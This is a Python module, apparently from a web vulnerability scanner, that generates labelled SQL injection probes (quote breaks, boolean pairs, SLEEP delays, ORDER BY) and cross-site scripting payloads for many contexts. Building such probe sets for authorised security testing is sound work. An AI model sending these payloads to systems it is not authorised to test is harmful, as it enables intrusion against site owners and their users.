from __future__ import annotations

from typing import TypedDict


class AttackRequest(TypedDict):

    set_id: str
    payload: str


def _sqli_error_requests() -> list[AttackRequest]:

    payloads = [
        "{value}'",
        '{value}"',
        "{value}'-- ",
        '{value}"-- ',
        "{value}')",
    ]
    return _numbered_requests("SQLI_error", payloads)


def _sqli_boolean_requests() -> list[AttackRequest]:

    request_pairs = [
        (
            "{value}' AND '1'='1",
            "{value}' AND '1'='2",
        ),
        (
            '{value}" AND "1"="1',
            '{value}" AND "1"="2',
        ),
        (
            "{value} AND 1=1",
            "{value} AND 1=2",
        ),
    ]

    requests: list[AttackRequest] = []
    for index, (true_payload, false_payload) in enumerate(request_pairs, start=1):
        suffix = f"{index:03d}"
        requests.extend(
            [
                {
                    "set_id": f"SQLI_boolean_true_{suffix}",
                    "payload": true_payload,
                },
                {
                    "set_id": f"SQLI_boolean_false_{suffix}",
                    "payload": false_payload,
                },
            ]
        )
    return requests


def _sqli_time_delay_requests(delay_seconds: int) -> list[AttackRequest]:

    payloads = [
        f"{{value}}' AND SLEEP({delay_seconds})-- ",
        f'{{value}}" AND SLEEP({delay_seconds})-- ',
        f"{{value}} AND SLEEP({delay_seconds})",
    ]
    return _numbered_requests("SQLI_time_delay", payloads)


def _sqli_order_by_requests(max_order_by: int) -> list[AttackRequest]:

    payloads: list[str] = []
    for index in range(1, max_order_by + 1):
        payloads.extend(
            [
                f"{{value}}' ORDER BY {index}-- ",
                f'{{value}}" ORDER BY {index}-- ',
                f"{{value}} ORDER BY {index}",
            ]
        )
    return _numbered_requests("SQLI_order_by", payloads)


def _xss_script_requests() -> list[AttackRequest]:

    payloads = [
        "<script>alert('{token}')</script>",
        '<script>alert("{token}")</script>',
        "</textarea><script>alert('{token}')</script>",
        "</title><script>alert('{token}')</script>",
        "</style><script>alert('{token}')</script>",
        "</script><script>alert('{token}')</script>",
    ]
    return _numbered_requests("XSS_script", payloads)


def _xss_event_handler_requests() -> list[AttackRequest]:

    payloads = [
        "<img src=x onerror=alert('{token}')>",
        "<svg onload=alert('{token}')>",
        "<body onload=alert('{token}')>",
        "<details open ontoggle=alert('{token}')>",
        "<input autofocus onfocus=alert('{token}')>",
        "<xss style=animation-name:ibds onanimationstart=alert('{token}')>",
    ]
    return _numbered_requests("XSS_event_handler", payloads)


def _xss_attribute_breakout_requests() -> list[AttackRequest]:

    payloads = [
        '" onmouseover=alert(\'{token}\') x="',
        "' onmouseover=alert(\"{token}\") x='",
        '" autofocus onfocus=alert(\'{token}\') x="',
        "' autofocus onfocus=alert(\"{token}\") x='",
        '"><img src=x onerror=alert(\'{token}\')>',
        "'><svg onload=alert(\"{token}\")>",
    ]
    return _numbered_requests("XSS_attribute_breakout", payloads)


def _xss_javascript_context_requests() -> list[AttackRequest]:

    payloads = [
        "';alert('{token}');//",
        '";alert("{token}");//',
        "`;alert('{token}');//",
        "${alert('{token}')}",
    ]
    return _numbered_requests("XSS_javascript_context", payloads)


def _xss_url_context_requests() -> list[AttackRequest]:

    payloads = [
        "javascript:alert('{token}')",
        "JaVaScRiPt:alert('{token}')",
        "javascript:confirm('{token}')",
        "data:text/html,<script>alert('{token}')</script>",
        "data:text/html,<svg onload=alert('{token}')>",
    ]
    return _numbered_requests("XSS_url_context", payloads)


def _xss_dom_context_requests() -> list[AttackRequest]:

    payloads = [
        "#<script>alert('{token}')</script>",
        "#\"><img src=x onerror=alert('{token}')>",
        "#'><svg onload=alert(\"{token}\")>",
        "#</script><script>alert('{token}')</script>",
    ]
    return _numbered_requests("XSS_dom_context", payloads)


def _xss_stored_context_requests() -> list[AttackRequest]:

    payloads = [
        '<script>document.body.setAttribute("data-ibds-xss","{token}")</script>',
        '<img src=x onerror="document.body.setAttribute(\'data-ibds-xss\',\'{token}\')">',
        '<svg onload="document.body.setAttribute(\'data-ibds-xss\',\'{token}\')">',
        '<iframe srcdoc="<script>alert(\'{token}\')</script>"></iframe>',
    ]
    return _numbered_requests("XSS_stored_context", payloads)


def _xss_escape_probe_requests() -> list[AttackRequest]:

    payloads = [
        "IBDS_XSS_ESC_{token}<>\"'&",
    ]
    return _numbered_requests("XSS_escape_probe", payloads)


def _numbered_requests(prefix: str, payloads: list[str]) -> list[AttackRequest]:

    return [
        {
            "set_id": f"{prefix}_{index:03d}",
            "payload": payload,
        }
        for index, payload in enumerate(payloads, start=1)
    ]


def build_attack_request_list(
    *,
    max_order_by: int = 10,
    delay_seconds: int = 5,
    include_sqli: bool = True,
    include_xss: bool = True,
) -> list[AttackRequest]:

    if include_sqli and max_order_by < 1:
        raise ValueError("max_order_by must be greater than or equal to 1")
    if include_sqli and delay_seconds < 1:
        raise ValueError("delay_seconds must be greater than or equal to 1")

    requests: list[AttackRequest] = []

    if include_sqli:
        requests.extend(_sqli_error_requests())
        requests.extend(_sqli_boolean_requests())
        requests.extend(_sqli_time_delay_requests(delay_seconds))
        requests.extend(_sqli_order_by_requests(max_order_by))

    if include_xss:
        requests.extend(_xss_script_requests())
        requests.extend(_xss_event_handler_requests())
        requests.extend(_xss_attribute_breakout_requests())
        requests.extend(_xss_javascript_context_requests())
        requests.extend(_xss_url_context_requests())
        requests.extend(_xss_dom_context_requests())
        requests.extend(_xss_stored_context_requests())
        requests.extend(_xss_escape_probe_requests())

    return requests